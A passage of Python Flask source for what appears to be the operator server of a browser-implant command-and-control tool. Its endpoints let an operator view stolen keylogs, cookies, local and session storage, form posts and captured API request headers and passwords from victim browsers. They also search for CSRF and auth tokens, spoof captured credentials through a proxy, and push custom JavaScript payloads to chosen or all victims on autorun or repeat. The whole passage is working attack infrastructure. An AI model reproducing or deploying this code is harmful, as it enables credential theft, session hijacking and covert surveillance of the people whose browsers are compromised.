    else:
        # Summary of all running proxies
        instances = get_all_proxy_instances()
        proxies = []
        for beacon_uuid, inst in instances.items():
            proxies.append({
                'beaconID': beacon_uuid,
                'port': inst.port,
                'wsConnected': has_ws_connection(beacon_uuid),
            })
        return jsonify({
            'running': len(proxies) > 0,
            'proxies': proxies,
        })


@app.route('/api/proxy/spoof', methods=['POST'])
@login_required
def setProxySpoof():
    """Toggle credential spoofing for a domain on a proxy beacon."""
    content = request.json
    domain = content.get('domain')
    enabled = content.get('enabled', True)
    beaconID_raw = content.get('beaconID')

    if not beaconID_raw:
        return jsonify({'error': 'beaconID required'}), 400

    client = Client.query.filter_by(id=beaconID_raw).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID_raw).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    beacon_uuid = client.uuid

    if not is_proxy_running_for(beacon_uuid):
        return jsonify({'error': 'No active proxy for this beacon'}), 400

    set_spoof_config(beacon_uuid, domain, enabled)

    # Build enriched spoof config with captured credential data for each enabled domain
    spoofPayload = _build_spoof_payload(beacon_uuid)

    # Notify the beacon of the updated spoof config so it knows which domains to inject creds for
    client = Client.query.filter_by(uuid=beacon_uuid).first()
    if client:
        taskData = {
            "type": "PROXY_SPOOF_UPDATE",
            "spoofConfig": spoofPayload,
        }
        jsonStr = json.dumps(taskData)
        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0,
                                  code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
        db_session.add(newJob)
        dbCommit()

    return jsonify({'status': 'ok', 'domain': domain, 'enabled': enabled})


def _build_spoof_payload(beacon_uuid):
    """Build per-domain spoof config with captured headers and user-agent.
    Returns {domain: {enabled, headers: [{name, value}], userAgent: str}} for each domain."""
    config = get_spoof_config(beacon_uuid)
    payload = {}

    client = Client.query.filter_by(uuid=beacon_uuid).first()
    if not client:
        return payload

    for domain, enabled in config.items():
        entry = {'enabled': enabled, 'headers': [], 'userAgent': client.rawUserAgent or ''}

        if enabled:
            # Find the BeaconDomain record for this domain
            bd = BeaconDomain.query.filter_by(clientID=beacon_uuid, domain=domain).first()
            if bd:
                # Get captured headers (Authorization, x-api-key, etc.) — most recent wins
                captures = BeaconCapture.query.filter_by(domainID=bd.id, captureType='header') \
                    .order_by(BeaconCapture.capturedAt.desc()).all()
                seen = set()
                for c in captures:
                    if c.name.lower() not in seen:
                        seen.add(c.name.lower())
                        entry['headers'].append({'name': c.name, 'value': c.value})

        payload[domain] = entry

    return payload


@app.route('/api/bex/proxy_ticket/<beaconID>', methods=['GET'])
@login_required
def getBexProxyTicket(beaconID):
    """Generate a proxy ticket for BEX Conductor. Only available when proxy is active."""
    client = Client.query.filter_by(id=beaconID).first()
    if not client:
        client = Client.query.filter_by(uuid=beaconID).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    beacon_uuid = client.uuid
    inst = get_proxy_instance(beacon_uuid)
    if not inst or not inst.running:
        return jsonify({'error': 'No active proxy for this beacon'}), 400

    # Get domains for this beacon
    domains = BeaconDomain.query.filter_by(clientID=beacon_uuid).all()
    domain_list = [d.domain for d in domains]

    # Derive proxy host from the operator's request Host header
    proxy_host = request.host.split(':')[0]

    # Get beacon nickname (if set)
    beacon_nickname = client.nickname or ''

    ticket = {
        'version': 1,
        'type': 'proxy',
        'generated': datetime.datetime.utcnow().isoformat() + 'Z',
        'beaconNickname': beacon_nickname,
        'proxy': {
            'host': proxy_host,
            'port': inst.port,
            'username': 'proxy',
            'password': inst.auth_token,
        },
        'domains': domain_list,
        'userAgent': client.rawUserAgent or '',
        'platform': client.platform or '',
        'browser': client.browser or '',
    }

    return jsonify(ticket)


@app.route('/api/proxy/ca_cert', methods=['GET'])
@login_required
def downloadCaCert():
    """Download the proxy CA certificate for browser import.
    Generates the CA on first request if it doesn't exist yet."""
    try:
        if not os.path.exists(CA_CERT_PATH):
            from proxy.certs import ensure_ca
            ensure_ca()

        with open(CA_CERT_PATH, 'rb') as f:
            cert_data = f.read()

        response = make_response(cert_data)
        response.headers['Content-Type'] = 'application/x-x509-ca-cert'
        response.headers['Content-Disposition'] = 'attachment; filename=jstap-proxy-ca.pem'
        response.headers['Content-Length'] = len(cert_data)
        return response
    except Exception as e:
        logger.error(f"CA cert download failed: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/clientEvents/<id>', methods=['GET'])
@login_required
def getClientEvents(id):
    # logger.info("Retrieving events table for client: " + id)
    client = Client.query.filter_by(id=id).first()
    clientUUID = client.uuid;

    events = Event.query.filter_by(clientID=clientUUID)

    eventData = [{'id':event.id, 'timeStamp':event.timeStamp,
        'eventType':event.eventType, 'eventID':event.eventID} for event in events]

    return jsonify(eventData)

    

@app.route('/api/clientScreenshot/<key>', methods=['GET'])
@login_required
def getClientScreenshots(key):
    screenshot = Screenshot.query.filter_by(id=key).first()

    screenshotData = {'fileName':screenshot.fileName}
    

    return jsonify(screenshotData)



@app.route('/api/clientHtml/<key>', methods=['GET'])
@login_required
def getClientHtml(key):
    htmlCode = HtmlCode.query.filter_by(id=key).first()

    fileLocation = dataDirectory + htmlCode.fileName[2:]
    with open(fileLocation, 'r') as file:
        code = file.read()

    # This one shouldn't be escaped
    htmlData = {'url':htmlCode.url, 'code':code, 'fileName':htmlCode.fileName}
    

    return jsonify(htmlData)



@app.route('/api/clientUrl/<key>', methods=['GET'])
@login_required
def getClientUrls(key):
    urlsVisited = UrlVisited.query.filter_by(id=key).first()

    urlData = {'url':urlsVisited.url}
    

    return jsonify(urlData)



@app.route('/api/clientUserInput/<key>', methods=['GET'])
@login_required
def getClientUserInputs(key):
    userInput = UserInput.query.filter_by(id=key).first()

    userInputData = {'inputName':userInput.inputName, 'inputValue':userInput.inputValue}
    

    return jsonify(userInputData)



@app.route('/api/clientCookie/<key>', methods=['GET'])
@login_required
def getClientCookies(key):
    # logger.info("*** In cookie lookup, key is: " + key)
    cookie = Cookie.query.filter_by(id=key).first()

    cookieData = {'cookieName':cookie.cookieName, 'cookieValue':cookie.cookieValue}
    

    return jsonify(cookieData)





@app.route('/api/clientLocalStorage/<key>', methods=['GET'])
@login_required
def getClientLocalStorage(key):
    # logger.info("**** Fetching client local storage...")
    localStorage = LocalStorage.query.filter_by(id=key).first()
    # logger.info("Sending back: " + localStorage.key + ":" + localStorage.value)
    
    localStorageData = {'localStorageKey':localStorage.key, 'localStorageValue':localStorage.value}
    

    return jsonify(localStorageData)




@app.route('/api/clientSessionStorage/<key>', methods=['GET'])
@login_required
def getClientSesssionStorage(key):
    sessionStorage = SessionStorage.query.filter_by(id=key).first()

    sessionStorageData = {'sessionStorageKey':sessionStorage.key, 'sessionStorageValue':sessionStorage.value}


    return jsonify(sessionStorageData)


@app.route('/api/clientKeylog/<key>', methods=['GET'])
@login_required
def getClientKeylog(key):
    keylog = Keylog.query.filter_by(id=key).first()

    keylogData = {'keys': keylog.keys, 'target': keylog.target or '', 'url': keylog.url or ''}

    return jsonify(keylogData)


@app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
@login_required
def getClientXhrApiCall(key):
    xhrApiCall = XhrApiCall.query.filter_by(id=key).first()
    xhrHeaders = XhrHeader.query.filter_by(apiCallID=key).all()

    headers_list = [{'header': header.header, 'value': header.value} for header in xhrHeaders]

    # for header in headers_list:
    #     print(f"---------Header: {header['header']}, Value: {header['value']}")


    xhrCallData = {
        'method': xhrApiCall.method,
        'url': xhrApiCall.url,
        'asyncRequest': xhrApiCall.asyncRequest,
        'user': xhrApiCall.user,
        'password': xhrApiCall.password,
        'responseStatus': xhrApiCall.responseStatus,
        'headers': headers_list
    }

    return jsonify(xhrCallData)





@app.route('/api/clientXhrCall/<key>', methods=['GET'])
@login_required
def getClientXhrCall(key):
    # logger.info("**** Fetching client xhr api call...")
    xhrCall = XhrApiCall.query.filter_by(id=key).first()

    xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}

    return jsonify(xhrCallData)






@app.route('/api/clientFetchApiCall/<key>', methods=['GET'])
@login_required
def getClientFetchApiCall(key):
    fetchApiCall = FetchApiCall.query.filter_by(id=key).first()
    fetchHeaders = FetchHeader.query.filter_by(apiCallID=key).all()

    headers_list = [{'header': header.header, 'value': header.value} for header in fetchHeaders]

    # for header in headers_list:
    #     print(f"---------Header: {header['header']}, Value: {header['value']}")


    fetchCallData = {
        'method': fetchApiCall.method,
        'url': fetchApiCall.url,
        'responseStatus': fetchApiCall.responseStatus,
        'headers': headers_list
    }

    return jsonify(fetchCallData)




@app.route('/api/clientFetchCall/<key>', methods=['GET'])
@login_required
def getClientFetchCall(key):
    # logger.info("**** Fetching client xhr api call...")
    fetchCall = FetchApiCall.query.filter_by(id=key).first()

    fetchCallData = {'requestBody':fetchCall.requestBody, 'responseBody':fetchCall.responseBody}

    return jsonify(fetchCallData)



@app.route('/api/clientFormPosts/<key>', methods=['GET'])
@login_required
def getClientFormPost(key):
    formPost = FormPost.query.filter_by(id=key).first()

    if not formPost:
        return jsonify({'error': 'not found'}), 404

    # formAction and data are base64 encoded at this point
    formPostData = {'name':formPost.formName, 'action':formPost.formAction, 'method':formPost.formMethod, 'data': formPost.formData, 'url':formPost.url}

    return jsonify(formPostData)



@app.route('/api/formCsrfTokenSearch/<key>', methods=['POST'])
@login_required
def searchCsrfToken(key):
    content    = request.json
    tokenName  = content['tokenName']
    tokenValue = content['tokenValue']

    formPost = FormPost.query.filter_by(id=key).first()

    clientID = formPost.clientID

    htmlLoot = HtmlCode.query.filter_by(clientID=clientID)

    foundToken = False
    for htmlCode in htmlLoot:
        # print("Going to search file: " + htmlCode.fileName)
        with open(htmlCode.fileName, 'r', encoding='utf-8') as file:
            content = file.read()

            if (tokenValue in content):
                if (tokenName in content):
                    foundToken = True
                    # print("Found to token in: " + htmlCode.fileName)
                    # print("URL is: " + htmlCode.url)

                    break

    if foundToken:
        tokenFileData = {'url':htmlCode.url, 'fileName':htmlCode.fileName}
    else:
        tokenFileData = {'url':'Not Found', 'fileName':'Not Found'}

    return jsonify(tokenFileData)




@app.route('/api/apiAuthTokenSearch/<key>', methods=['POST'])
@login_required
def searchApiAuthToken(key):
    content    = request.json
    apiType    = content['type']
    tokenValue = content['tokenValue']

    locationType = ""

    # Search cookies, local, session

    if apiType == 'XHR':
        apiCall = XhrApiCall.query.filter_by(id=key).first()
    elif apiType == 'FETCH':
        apiCall = FetchApiCall.query.filter_by(id=key).first()

    clientID = apiCall.clientID

    # Search all local storage, most likely spot
    localStorage = LocalStorage.query.filter_by(clientID=clientID, value=tokenValue).first()

    if localStorage is not None:
        locationType = "Local Storage"
        tokenName    = localStorage.key
    else:
        # It's not in local storage, check session storage
        sessionStorage = SessionStorage.query.filter_by(clientID=clientID, value=tokenValue).first()

        if sessionStorage is not None:
            locationType = "Session Storage"
            tokenName    = sessionStorage.key
        else:
            # Not there either, check cookies
            cookieStorage = Cookie.query.filter_by(clientID=clientID, cookieValue=tokenValue).first()

            if cookieStorage is not None:
                locationType = "Cookies"
                tokenName    = cookieStorage.cookieName
            else:
                locationType = "NOT FOUND"
                tokenName    = "NOT FOUND"

    # print("*** At end of auth token search, was found in: " + locationType)

    locationData = {'location':locationType, 'tokenName':tokenName}

    return jsonify(locationData)







@app.route('/api/clientCustomExfilNote/<key>', methods=['GET'])
@login_required
def getClientCustomExfil(key):
    customExfil = CustomExfil.query.filter_by(id=key).first()

    # Note these are base64 encoded at this point, they'll need
    # to be escaped client side
    customExfilData = {'note':customExfil.note}

    return jsonify(customExfilData)



@app.route('/api/clientCustomExfilDetail/<key>', methods=['GET'])
@login_required
def getClientCustomExfilDetail(key):
    customExfil = CustomExfil.query.filter_by(id=key).first()

    if not customExfil:
        return jsonify({'error': 'not found'}), 404

    # Note these are base64 encoded at this point, they'll need
    # to be escaped client side
    customExfilData = {'note':customExfil.note, 'data':customExfil.data}

    return jsonify(customExfilData)




@app.route('/api/updateClientNotes/<key>', methods=['POST'])
@login_required
def setClientNotes(key):
    content = request.json 
    newNote = content['note']
    client  = Client.query.filter_by(id=key).first()
   
    client.notes = newNote
    dbCommit()

    return "ok", 200


@app.route('/api/updateClientNickname/<key>', methods=['POST'])
@login_required
def setClientNickname(key):
    content  = request.json
    nickname = content.get('nickname', '').strip()

    if not nickname:
        return jsonify({'error': 'Nickname cannot be empty'}), 400

    if len(nickname) > 60:
        return jsonify({'error': 'Nickname must be 60 characters or fewer'}), 400

    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]*$', nickname):
        return jsonify({'error': 'Nickname must start with a letter or number and contain only letters, numbers, spaces, hyphens, underscores, and periods'}), 400

    client = Client.query.filter_by(id=key).first()
    if not client:
        return jsonify({'error': 'Client not found'}), 404

    # Check uniqueness (case-insensitive)
    existing = Client.query.filter(Client.nickname == nickname, Client.id != int(key)).first()
    if existing:
        return jsonify({'error': 'Nickname "' + nickname + '" is already in use'}), 409

    client.nickname = nickname
    dbCommit()

    return jsonify({'nickname': nickname}), 200


@app.route('/api/allClientNotes', methods=['GET'])
@login_required
def getAllClientNotes():
    clients = Client.query.all()
    allNoteData = []
    for client in clients:
        if not client.notes:
            continue

        entry = {
            'nickname':   client.nickname,
            'tag':        client.tag or '',
            'clientType': client.clientType,
            'ipAddress':  client.ipAddress or '',
            'platform':   client.platform or '',
            'browser':    client.browser or '',
            'firstSeen':  str(client.firstSeen) if client.firstSeen else '',
            'lastSeen':   str(client.lastSeen) if client.lastSeen else '',
            'note':       client.notes,
        }

        # Include domains for beacon clients
        if client.clientType in ('bex-beacon', 'atom-beacon'):
            domains = BeaconDomain.query.filter_by(clientID=client.uuid).all()
            entry['domains'] = [d.domain for d in domains]

        allNoteData.append(entry)

    return jsonify(allNoteData)


@app.route('/api/updateClientStar/<key>', methods=['POST'])
@login_required
def setClientStar(key):
    content   = request.json
    isStarred = content['isStarred']
    client    = Client.query.filter_by(id=key).first()
  
    client.isStarred = isStarred 
    dbCommit()

    return "ok", 200



@app.route('/api/app/obfuscateTraffic', methods=['GET'])
@login_required
def getObfuscateTrafficSetting():
    appSettings = AppSettings.query.filter_by(id=1).first()

    obfuscateDataSetting = {'obfuscateTraffic':appSettings.obfuscateTraffic}

    return jsonify(obfuscateDataSetting)



@app.route('/api/app/setObfuscateTraffic/<setting>', methods=['GET'])
@login_required
def setObfuscateTrafficSetting(setting):
    appSettings = AppSettings.query.filter_by(id=1).first()
   
    if setting == 'true':
        appSettings.obfuscateTraffic = True
    elif setting == 'false':
        appSettings.obfuscateTraffic = False
    else:
        logger.error("Invalid true/false value in setObfuscateTrafficSetting:" + setting)

    dbCommit()

    return "ok", 200




@app.route('/api/app/allowNewClientSessions', methods=['GET'])
@login_required
def getAllowNewClientSessions():
    appSettings = AppSettings.query.filter_by(id=1).first()

    newSessionData = {'newSessionsAllowed':appSettings.allowNewSessions}

    return jsonify(newSessionData)



@app.route('/api/app/setAllowNewClientSessions/<setting>', methods=['GET'])
@login_required
def setAllowNewClientSessions(setting):
    appSettings = AppSettings.query.filter_by(id=1).first()
   
    if (setting != '0' and setting != '1'):
        return "No.", 401
    elif setting == '1':
        appSettings.allowNewSessions = True
    else:
        appSettings.allowNewSessions = False

    dbCommit()

    return "ok", 200




@app.route('/api/app/showFingerprint/<setting>', methods=['GET'])
@login_required
def setShowFingerprint(setting):
    appSettings = AppSettings.query.filter_by(id=1).first()
   
    if setting == 'true':
        appSettings.showFingerprint = True
    elif setting == 'false':
        appSettings.showFingerprint = False
    else:
        logger.error("Invalid true/false value in showFingerprint:" + setting)

    dbCommit()

    return "ok", 200




@app.route('/api/app/getShowFingerprintSetting', methods=['GET'])
@login_required
def getShowFingerprint():
    appSettings = AppSettings.query.filter_by(id=1).first()

    fingerprintData = {'fingerprintEnabled':appSettings.showFingerprint}

    return jsonify(fingerprintData)



@app.route('/api/app/getEmailSettings', methods=['GET'])
@login_required
def getEmailSettings():
    appSettings = AppSettings.query.filter_by(id=1).first()

    emailData = {'emailServer':appSettings.emailServer, 'username':appSettings.emailUsername, 'password':'*********', 'eventType': appSettings.emailEventType, 'delay': appSettings.emailDelay}

    return jsonify(emailData)



@app.route('/api/app/saveEmailSettings', methods=['POST'])
@login_required
def saveEmailSettings():
    content = request.json

    appSettings = AppSettings.query.filter_by(id=1).first()

    appSettings.emailServer    = content['emailServer']
    appSettings.emailUsername  = content['username']
    appSettings.emailEventType = content['eventType']
    appSettings.emailDelay     = content['delay']

    if content['password'] != '*********':
        # It's an actual password, not our "hide" string
        appSettings.emailPassword  = content['password']
    

    dbCommit()

    return "ok", 200




@app.route('/api/app/enableEmailNotifications/<setting>', methods=['GET'])
@login_required
def changeEmailNoficiations(setting):
    appSettings = AppSettings.query.filter_by(id=1).first()

    if setting == 'true':
        appSettings.emailEnable = True
    elif setting == 'false':
        appSettings.emailEnable = False
    else:
        logger.error("Invalid true/false value in enableEmailNotifications:" + setting)
    
    dbCommit()

    return "ok", 200



@app.route('/api/app/getEmailNotificationSetting', methods=['GET'])
@login_required
def getEmailNotifications():
    appSettings = AppSettings.query.filter_by(id=1).first()
   
    emailEnableData = {'emailEnable': appSettings.emailEnable}

    return jsonify(emailEnableData)





@app.route('/api/getTargetEmails', methods=['GET'])
@login_required
def getTargetEmails():
    targetEmails = NotificationEmail.query.all()

    allEmails = [{'id':targetEmail.id, 'address':targetEmail.emailAddress} for targetEmail in targetEmails]

    return jsonify(allEmails)
 

@app.route('/api/addTargetEmail', methods=['POST'])
@login_required
def addTargetEmail(): 
    content      = request.json
    emailAddress = content['emailAddress']

    emailAddress = NotificationEmail(emailAddress=emailAddress)
    db_session.add(emailAddress)
    dbCommit()

    return "ok", 200


@app.route('/api/deleteTargetEmail/<key>', methods=['GET'])
@login_required
def deleteTargetEmail(key):
    emailAddress = NotificationEmail.query.filter_by(id=key).first()

    db_session.delete(emailAddress)
    dbCommit()

    return "ok", 200





@app.route('/api/sendTestEmail', methods=['GET'])
@login_required
def sendTestEmailEndpoint():
    backgroundExecutor.submit(sendTestEmail)

    return "ok", 200





@app.route('/api/app/clientRefreshRate', methods=['GET'])
@login_required
def getClientRefreshRate():
    appSettings = AppSettings.query.filter_by(id=1).first()

    refreshData = {'clientRefreshRate':appSettings.clientRefreshRate}

    return jsonify(refreshData)



@app.route('/api/app/setClientRefreshRate/<rate>', methods=['GET'])
@login_required
def setClientRefreshRate(rate):
    rate = int(rate)

    if rate < 1 or rate > 3600:
        return "No.", 401
    else:
        appSettings = AppSettings.query.filter_by(id=1).first()
        appSettings.clientRefreshRate = rate
        dbCommit()

        return "ok", 200




@app.route('/api/blockClientSession/<key>', methods=['GET'])
@login_required
def blockClientSession(key):
    client = Client.query.filter_by(id=key).first()
    client.sessionValid = False;
    dbCommit()

    return "ok", 200



@app.route('/api/getBlockedIPs', methods=['GET'])
@login_required
def getBlockedIPs():
    blockedIPs = BlockedIP.query.all()

    allBlockedIPs = [{'id':blockedIP.id, 'ip':blockedIP.ip} for blockedIP in blockedIPs]

    return jsonify(allBlockedIPs)



@app.route('/api/blockIP', methods=['POST'])
@login_required
def blockIP(): 
    content = request.json
    ip      = content['ip']

    blockedIP = BlockedIP(ip=ip)
    db_session.add(blockedIP)
    dbCommit()

    return "ok", 200



@app.route('/api/deleteBlockedIP/<key>', methods=['GET'])
@login_required
def deleteBlockedIP(key):
    blockedIP = BlockedIP.query.filter_by(id=key).first()

    db_session.delete(blockedIP)
    dbCommit()

    return "ok", 200



@app.route('/api/getSavedPayloads', methods=['GET'])
@login_required
def getSavedCustomPayloads():
    savedPayloads = CustomPayload.query.all()

    allSavedPayloads = [{'id':payload.id, 'name':payload.name, 'autorun':payload.autorun, 'repeatrun':payload.repeatrun} for payload in savedPayloads]

    return jsonify(allSavedPayloads)





# Returns the payload list and whether that payload
# is enabled for autorun for the particular client key
@app.route('/api/getPayloadsForClient/<key>', methods=['GET'])
@login_required
def getPayloadsForClient(key):
    clientSavedPayloads = []
    savedPayloads = CustomPayload.query.all()

    repeatRunJobs = ClientPayloadJob.query.filter_by(clientKey=key).filter_by(repeatrun=True).all()

    for payload in savedPayloads:
        repeatRunFound = False
        
        for job in repeatRunJobs:
            if job.payloadKey == payload.id:
                repeatRunFound = True
                break

        payloadData = {
            'id':payload.id,
            'name':payload.name,
            'autorun':payload.autorun,
            'repeatrun':repeatRunFound
        }

        clientSavedPayloads.append(payloadData)


    return jsonify(clientSavedPayloads)





@app.route('/api/getSavedPayloadCode/<key>', methods=['GET'])
@login_required
def getSavedPayloadCode(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    payloadData = {'name':payload.name, 'description':payload.description, 'code':payload.code}

    return jsonify(payloadData)



@app.route('/api/getAllPayloads', methods=['GET'])
@login_required
def getAllSavedPayloads():
    payloads = CustomPayload.query.all()

    allPayloadsDump = [{'name':payload.name, 'description':payload.description, 'code':payload.code} for payload in payloads]

    return jsonify(allPayloadsDump)






@app.route('/api/setPayloadAutorun', methods=['POST'])
@login_required
def setPayloadAutorun():
    content = request.json
    name    = content['name']
    autorun = content['autorun']

    payload = CustomPayload.query.filter_by(name=name).first()
    
    payload.autorun = autorun

    dbCommit()

    return "ok", 200


@app.route('/api/runPayloadAllClients/<key>', methods=['GET'])
@login_required
def runPayloadAllClients(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    clients = Client.query.all()

    for client in clients:
        if client.sessionValid:
            newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
            db_session.add(newJob)

    dbCommit()

    return "ok", 200



@app.route('/api/setPayloadRepeatRun', methods=['POST'])
@login_required
def repeatPayloadAllClients():
    content   = request.json
    name      = content['name']
    repeatrun = content['repeatrun']

    payload = CustomPayload.query.filter_by(name=name).first()
    
    payload.repeatrun = repeatrun

    # need to cancel individual client jobs
    if payload.repeatrun == False:
        clientJobs = ClientPayloadJob.query.filter_by(payloadKey=payload.id)

        for clientJob in clientJobs:
            db_session.delete(clientJob)


    dbCommit()

    return "ok", 200




@app.route('/api/singleClientPayloadRepeatRun', methods=['POST'])
@login_required
def repeatPayloadSingleClient():
    content   = request.json
    name      = content['name']
    clientID  = content['clientID']
    repeatrun = content['repeatrun']

    payload = CustomPayload.query.filter_by(name=name).first()
    

    if repeatrun:
        # Turn it on
        newJob = ClientPayloadJob(clientKey=clientID, payloadKey=payload.id, code=payload.code, repeatrun=True)
        db_session.add(newJob)
    else:
        # Turn it off
        currentClientPayloads = (ClientPayloadJob.query
        .filter_by(clientKey=clientID)
        .filter_by(payloadKey=payload.id)
        .filter_by(repeatrun=True))

        for clientPayload in currentClientPayloads:
            clientPayload.repeatrun = False 

    dbCommit()

    return "ok", 200



@app.route('/api/runPayloadSingleClient', methods=['POST'])
@login_required
def runPayloadSingleClient():
    content = request.json 

    payloadKey = content['payloadKey']
    clientKey  = content['clientKey']

    payload = CustomPayload.query.filter_by(id=payloadKey).first()

    # testing just for the print
    # client = Client.query.filter_by(id=clientKey).first()

    # logger.info("Running single client payload:")
    # logger.info("Client: " + client.nickname)
    # logger.info("Code: " + payload.code)

    newJob = ClientPayloadJob(clientKey=clientKey, payloadKey=payloadKey, code=payload.code)
    db_session.add(newJob)
    dbCommit()

    return "ok", 200



@app.route('/api/clearAllPayloadJobs', methods=['GET'])
@login_required
def clearAllPayloadJobs():
    # logger.info("Clearing all client payload jobs...")
    db_session.query(ClientPayloadJob).delete()

    CustomPayloads = CustomPayload.query.filter_by(autorun=True)

    for payload in CustomPayloads:
        payload.autorun=False

    CustomPayloads = CustomPayload.query.filter_by(repeatrun=True)

    for payload in CustomPayloads:
        payload.repeatrun=False

    # Disable all target rule autorun and repeat flags
    targetRules = PayloadTargetRule.query.filter_by(active=True).all()
    for rule in targetRules:
        rule.active = False
    targetRules = PayloadTargetRule.query.filter_by(repeatrun=True).all()
    for rule in targetRules:
        rule.repeatrun = False

    dbCommit()

    return "ok", 200
   


@app.route('/api/payload/targetRule/preview', methods=['POST'])
@login_required
def previewTargetRule():
    content = request.json
    filterQuery = content.get('filterQuery', '').strip()
    if not filterQuery:
        return jsonify({'matched': 0, 'clients': []}), 200

    clients = Client.query.filter_by(sessionValid=True).all()
    matched = []

    for client in clients:
        if clientMatchesFilter(client, filterQuery):
            matched.append({
                'nickname': client.nickname or client.uuid[:8],
                'ip': client.ipAddress or '',
                'platform': client.platform or '',
                'browser': client.browser or '',
                'tag': client.tag or '',
                'clientType': client.clientType or '',
                'domain': client.domain or '',
                'firstSeen': client.firstSeen,
                'lastSeen': client.lastSeen
            })
            if len(matched) >= 50:
                break

    return jsonify({'matched': len(matched), 'clients': matched}), 200



@app.route('/api/payload/<int:payloadId>/targetRules', methods=['GET'])
@login_required
def getTargetRules(payloadId):
    rules = PayloadTargetRule.query.filter_by(payloadKey=payloadId).all()
    result = []
    for r in rules:
        result.append({
            'id': r.id,
            'payloadKey': r.payloadKey,
            'filterQuery': r.filterQuery,
            'active': r.active,
            'repeatrun': r.repeatrun
        })
    return jsonify(result)



@app.route('/api/payload/<int:payloadId>/targetRule', methods=['POST'])
@login_required
def addTargetRule(payloadId):
    content = request.json
    filterQuery = content.get('filterQuery', '').strip()
    if not filterQuery:
        return "Filter query required", 400

    payload = CustomPayload.query.filter_by(id=payloadId).first()
    if not payload:
        return "Payload not found", 404

    rule = PayloadTargetRule(payloadKey=payloadId, filterQuery=filterQuery)
    db_session.add(rule)
    dbCommit()

    return jsonify({'id': rule.id}), 200



@app.route('/api/payload/targetRule/<int:ruleId>/update', methods=['POST'])
@login_required
def updateTargetRule(ruleId):
    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
    if not rule:
        return "Rule not found", 404

    content = request.json
    filterQuery = content.get('filterQuery', '').strip()
    if not filterQuery:
        return "Filter query required", 400

    rule.filterQuery = filterQuery
    dbCommit()

    return jsonify({'id': rule.id, 'filterQuery': rule.filterQuery}), 200



@app.route('/api/payload/targetRule/<int:ruleId>/toggle', methods=['POST'])
@login_required
def toggleTargetRule(ruleId):
    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
    if not rule:
        return "Rule not found", 404

    rule.active = not rule.active
    dbCommit()

    return jsonify({'active': rule.active}), 200



@app.route('/api/payload/targetRule/<int:ruleId>/repeat', methods=['POST'])
@login_required
def toggleTargetRuleRepeat(ruleId):
    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
    if not rule:
        return "Rule not found", 404

    rule.repeatrun = not rule.repeatrun
    dbCommit()

    return jsonify({'repeatrun': rule.repeatrun}), 200



@app.route('/api/payload/targetRule/<int:ruleId>/run', methods=['POST'])
@login_required
def runTargetRule(ruleId):
    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
    if not rule:
        return "Rule not found", 404

    payload = CustomPayload.query.filter_by(id=rule.payloadKey).first()
    if not payload:
        return "Payload not found", 404

    clients = Client.query.filter_by(sessionValid=True).all()
    matched = 0

    for client in clients:
        if clientMatchesFilter(client, rule.filterQuery):
            # Check if client already has a job for this payload
            existing = ClientPayloadJob.query.filter_by(clientKey=client.id, payloadKey=payload.id).first()
            if not existing:
                newJob = ClientPayloadJob(clientKey=client.id, payloadKey=payload.id, code=payload.code)
                db_session.add(newJob)
                matched += 1

    if matched > 0:
        dbCommit()

    return jsonify({'matched': matched}), 200



@app.route('/api/payload/targetRule/<int:ruleId>', methods=['DELETE'])
@login_required
def deleteTargetRule(ruleId):
    rule = PayloadTargetRule.query.filter_by(id=ruleId).first()
    if not rule:
        return "Rule not found", 404

    db_session.delete(rule)
    dbCommit()

    return "ok", 200



@app.route('/api/savePayload', methods=['POST'])
@login_required
def saveCustomPayload():
    content        = request.json 

    name           = content['name']
    newDescription = content['description']
    newCode        = content['code']

    # Check if this is an existing payload we're just updating
    payload = CustomPayload.query.filter_by(name=name).first()

    if payload is not None:
        payload.description = newDescription
        payload.code        = newCode
    else:
        newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
        db_session.add(newPayload)

    dbCommit()

    return "ok", 200



@app.route('/api/savePayloads', methods=['POST'])
@login_required
def saveCustomPayloads():
    contents        = request.json 

    for content in contents:
        name           = content['name']
        newDescription = content['description']
        newCode        = content['code']

        # Check if this is an existing payload we're just updating
        payload = CustomPayload.query.filter_by(name=name).first()

        if payload is not None:
            payload.description = newDescription
            payload.code        = newCode
        else:
            newPayload = CustomPayload(name=name, description=newDescription, code=newCode)
            db_session.add(newPayload)

    dbCommit()

    return "ok", 200




@app.route('/api/deletePayload/<key>', methods=['GET'])
@login_required
def deleteCustomPayload(key):
    payload = CustomPayload.query.filter_by(id=key).first()

    # Cascade delete target rules and orphaned jobs for this payload
    PayloadTargetRule.query.filter_by(payloadKey=payload.id).delete()
    ClientPayloadJob.query.filter_by(payloadKey=payload.id).delete()

    db_session.delete(payload)
    dbCommit()

    return "ok", 200


# Loot Search - cross-client content search
def escape_like(s):
    return s.replace('\\', '\\\\').replace('%', r'\%').replace('_', r'\_')


@app.route('/api/lootSearch', methods=['POST'])
@login_required
def lootSearch():
    content    = request.json
    clientFilter = content.get('clientFilter', '').strip()
    searchQuery  = content.get('searchQuery', '').strip()
    eventTypes   = content.get('eventTypes', [])
    sortOrder    = content.get('sortOrder', 'newest')
    page         = content.get('page', 1)
    perPage      = 50

    # Phase 1: Filter clients
    clients = Client.query.all()
    if clientFilter:
        terms = []
        for t in clientFilter.split('&&'):
            t = t.strip().lower()
            if not t:
                continue
            negate = False
            if t.startswith('!'):
                negate = True
                t = t[1:].strip()
            if t:
                terms.append({'term': t, 'negate': negate})

        filtered = []
        for c in clients:
            haystack = ' '.join([
                c.tag or '', c.nickname or '', c.ipAddress or '',
                c.platform or '', c.browser or '',
                c.clientType or '', c.domain or '', c.uuid or ''
            ]).lower()
            keep = True
            for term in terms:
                found = term['term'] in haystack
                if term['negate'] and found:
